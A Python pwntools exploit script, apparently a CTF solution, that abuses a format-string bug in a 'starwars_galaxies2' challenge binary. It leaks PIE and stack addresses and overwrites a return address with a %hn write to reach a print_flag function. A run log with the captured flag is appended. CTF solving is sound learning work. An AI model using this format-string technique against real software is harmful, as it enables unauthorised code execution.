from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './starwars_galaxies2'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "0.cloud.chals.io"
  PORT = 34916
  s = remote(HOST, PORT)
  return_offset = 0x110
else:
  s = process(BINARY)
  return_offset = 0x100

def Create(name, idx, cls):
  s.sendlineafter(">> ", "0")
  s.sendlineafter("name: ", name)
  s.sendlineafter("id number: ", str(idx))
  s.sendlineafter("class: ", str(cls))

def Play():
  s.sendlineafter(">> ", "1")

def View():
  s.sendlineafter(">> ", "2")

Create("%45$p,%51$p", 0, 0)
View()

pie_leak    = int(s.recvuntil(",")[:-1], 16)
pie_base    = pie_leak - 0x124a
print_flag  = pie_base + 0x11d9
stack_leak  = int(s.recvuntil("\n")[:-1], 16)
return_addr = stack_leak - return_offset  

print "pie_leak   =", hex(pie_leak)
print "pie_base   =", hex(pie_base)
print "stack_leak =", hex(stack_leak)

index = 8
a0 = print_flag&0xffff
a0 = ((a0-1) % 0x10000) + 1
buf = "%%%dc%%%d$hn" % (a0, index+2)
buf += "-"*(8-len(buf)%8)
buf += p64(return_addr)

Create(buf, 0, 0)
View()
Play()
s.interactive()

'''
mito@ubuntu:~/CTF/Space_Heroes_CTF_2022/Pwn_Star_Wars_Galaxies_2$ python solve.py r
[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Star_Wars_Galaxies_2/starwars_galaxies2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 0.cloud.chals.io on port 34916: Done
pie_leak   = 0x563c41fb724a
pie_base   = 0x563c41fb6000
stack_leak = 0x7fff627e1938
[*] Switching to interactive mode
shctf{l00k1ng_f0rw4rd_2_k0t0r_r3m4k3}
Welcome to Starwars Galaxies 2: Empire's new groove
pls buy the game so we can afford real devs and graphics
'''
